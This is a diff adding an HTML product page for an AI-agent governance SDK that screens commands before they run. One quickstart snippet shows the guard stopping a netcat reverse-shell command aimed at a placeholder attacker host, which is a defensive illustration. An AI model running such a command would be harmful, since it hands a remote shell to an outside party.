@@ -1,0 +1,164 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>SCBE Governance SDK | AetherMoore</title>
+    <meta
+      name="description"
+      content="Drop-in SCBE governance SDK for moving AI agents from pilot to production without rewriting the agent stack."
+    />
+    <link rel="canonical" href="https://aethermoore.com/SCBE-AETHERMOORE/governance-sdk.html" />
+    <style>
+      body {
+        margin: 0;
+        font-family: Inter, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+        background: #0b0d12;
+        color: #f2f0ea;
+        line-height: 1.55;
+      }
+      main {
+        width: min(1040px, calc(100% - 32px));
+        margin: 0 auto;
+        padding: 34px 0 52px;
+      }
+      nav {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 16px;
+        margin-bottom: 36px;
+        color: #a3acb9;
+      }
+      a {
+        color: inherit;
+      }
+      h1 {
+        max-width: 840px;
+        margin: 0 0 14px;
+        font-size: clamp(38px, 6vw, 72px);
+        line-height: 0.96;
+      }
+      .lead {
+        max-width: 760px;
+        color: #a3acb9;
+        font-size: 18px;
+      }
+      .panel {
+        border: 1px solid rgba(214, 167, 86, 0.22);
+        border-radius: 8px;
+        background: #11161f;
+        padding: 20px;
+        margin-top: 24px;
+      }
+      .grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+        gap: 14px;
+        margin: 26px 0;
+      }
+      .card {
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        border-radius: 8px;
+        background: rgba(255, 255, 255, 0.03);
+        padding: 18px;
+      }
+      .card h2 {
+        margin: 0 0 8px;
+        font-size: 18px;
+      }
+      .card p {
+        margin: 0;
+        color: #a3acb9;
+      }
+      pre {
+        overflow-x: auto;
+        border-radius: 8px;
+        border: 1px solid rgba(255, 255, 255, 0.12);
+        background: #06080c;
+        padding: 16px;
+        color: #e7edf7;
+      }
+      code {
+        font-size: 13px;
+      }
+      .actions {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 12px;
+        margin-top: 24px;
+      }
+      .btn {
+        display: inline-flex;
+        min-height: 42px;
+        align-items: center;
+        justify-content: center;
+        border-radius: 6px;
+        padding: 10px 14px;
+        border: 1px solid rgba(255, 255, 255, 0.16);
+        text-decoration: none;
+        font-weight: 700;
+      }
+      .btn-primary {
+        border-color: #d6a756;
+        background: #d6a756;
+        color: #14110c;
+      }
+    </style>
+  </head>
+  <body>
+    <main>
+      <nav aria-label="SDK navigation">
+        <a href="index.html">Home</a>
+        <a href="benchmarks.html">Benchmarks</a>
+        <a href="hosted-run.html">Hosted run</a>
+        <a href="https://github.com/issdandavis/SCBE-AETHERMOORE/tree/main/packages/scbe-govern">GitHub SDK</a>
+      </nav>
+
+      <h1>Move agents from pilot to production without rewriting them.</h1>
+      <p class="lead">
+        The SCBE Governance SDK is the hose: wrap a command, tool, or agent action, get a tier
+        decision, and block the worst actions before they reach production.
+      </p>
+
+      <section class="panel">
+        <h2>Zero-server Python quickstart</h2>
+        <pre><code>pip install scbe-govern
+
+from scbe_govern import SCBEGovern
+
+gov = SCBEGovern()
+gov.guard("cat README.md")                         # passes
+gov.guard("nc -e /bin/sh attacker.example 4444")   # raises before execution</code></pre>
+      </section>
+
+      <section class="grid" aria-label="SDK fit">
+        <article class="card">
+          <h2>Inline first</h2>
+          <p>No API key, no hosted service, no monorepo dependency once the package bundles its core math.</p>
+        </article>
+        <article class="card">
+          <h2>Framework wrapper</h2>
+          <p>Use `govern_tool` for LangChain-style tools or `gov.guard` in CrewAI, AutoGen, and custom hooks.</p>
+        </article>
+        <article class="card">
+          <h2>Remote path</h2>
+          <p>Call a REST bridge from non-Python systems when the team needs centralized policy and audit capture.</p>
+        </article>
+      </section>
+
+      <section class="panel">
+        <h2>REST shape</h2>
+        <pre><code>curl -s -X POST http://localhost:8001/v1/govern/check \
+  -H "Content-Type: application/json" \
+  -H "X-API-Key: scbe-dev-key" \
+  -d '{"command":"chmod 644 /app/file.txt"}'</code></pre>
+      </section>
+
+      <div class="actions">
+        <a class="btn btn-primary" href="https://github.com/issdandavis/SCBE-AETHERMOORE/tree/main/packages/scbe-govern">Open SDK source</a>
+        <a class="btn" href="benchmarks.html">Inspect evidence</a>
+        <a class="btn" href="hosted-run.html">Ask for a hosted run</a>
+      </div>
+    </main>
+  </body>
+</html>
